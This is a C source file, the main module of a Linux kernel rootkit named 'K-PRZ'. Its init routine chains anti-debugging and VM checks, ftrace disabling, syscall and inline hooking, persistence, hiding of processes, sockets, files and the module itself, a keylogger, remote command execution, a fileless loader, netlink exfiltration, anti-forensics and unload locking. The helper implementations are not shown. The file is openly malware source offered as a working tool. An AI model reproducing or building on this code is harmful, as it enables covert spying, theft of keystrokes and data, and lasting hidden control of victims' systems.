#include <linux/module.h>
#include <linux/kernel.h>
#include "ftrace_hook.h"
#include "string_encrypt.h"
#include "hmac_auth.h"
#include "persistence.h"
#include "directory_encrypt.h"
#include "anti_debug.h"
#include "watchdog.h"
#include "inline_hook.h"
#include "netfilter_trigger.h"
#include "process_hiding.h"
#include "module_hiding.h"
#include "socket_hiding.h"
#include "syscall_hook.h"
#include "reverse_shell.h"
#include "keylogger.h"
#include "anti_forensics.h"
#include "packet_filter.h"
#include "anti_watchdog.h"
#include "vfs_file_hiding.h"
#include "command_executor.h"
#include "delayed_activation.h"
#include "fileless_loader.h"
#include "self_watchdog.h"
#include "unload_protection.h"
#include "anti_memdump.h"
#include "sysctl_hiding.h"
#include "breakpoint_detector.h"
#include "netlink_exfil.h"
#include "anti_kprobe.h"
#include "recovery_trigger.h"
#include "trace_disabler.h"
#include "heap_encrypt.h"
#include "key_injector.h"
#include "rootkit_core.h"

static int __init rootkit_init(void) {
#ifdef ENABLE_STRING_ENCRYPT
    decrypt_all_strings();
#endif

    anti_debug_and_vm_checks();
    disable_ftrace_tracing();
    check_for_breakpoints();
    check_function_integrity();

#ifdef ENABLE_INLINE_HOOK
    setup_inline_hooks();
#endif

    fh_install_all();

#ifdef ENABLE_WATCHDOG
    start_watchdog();
#endif

#ifdef ENABLE_TRIGGER
    setup_netfilter_trigger();
#endif

    setup_persistence();
    setup_process_hiding();
    setup_socket_hiding();
    setup_syscall_hook();
    start_keylogger();
    setup_anti_forensics();
    setup_packet_filter();
    setup_anti_watchdog();
    setup_vfs_file_hiding();
    setup_command_executor();
    start_delayed_activation();
    setup_fileless_loader();
    start_self_watchdog();
    setup_anti_memdump();
    setup_sysctl_hiding();
    setup_netlink_exfil();
    rootkit_core_init();
    hide_module();
    lock_module_unloading();

    return 0;
}

static void __exit rootkit_exit(void) {
#ifdef ENABLE_TRIGGER
    cleanup_netfilter_trigger();
#endif

#ifdef ENABLE_WATCHDOG
    stop_watchdog();
#endif

    fh_remove_all();

#ifdef ENABLE_INLINE_HOOK
    remove_inline_hooks();
#endif

#ifdef ENABLE_STRING_ENCRYPT
    encrypt_all_strings();
#endif

    cleanup_persistence();
    remove_process_hiding();
    remove_socket_hiding();
    remove_syscall_hook();
    stop_keylogger();
    remove_anti_forensics();
    remove_packet_filter();
    remove_anti_watchdog();
    remove_vfs_file_hiding();
    remove_command_executor();
    cleanup_fileless_loader();
    stop_self_watchdog();
    remove_anti_memdump();
    remove_sysctl_hiding();
    cleanup_netlink_exfil();
    rootkit_core_exit();
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ivan Borakove");
MODULE_DESCRIPTION("K-PRZ Rootkit Kernel Module");
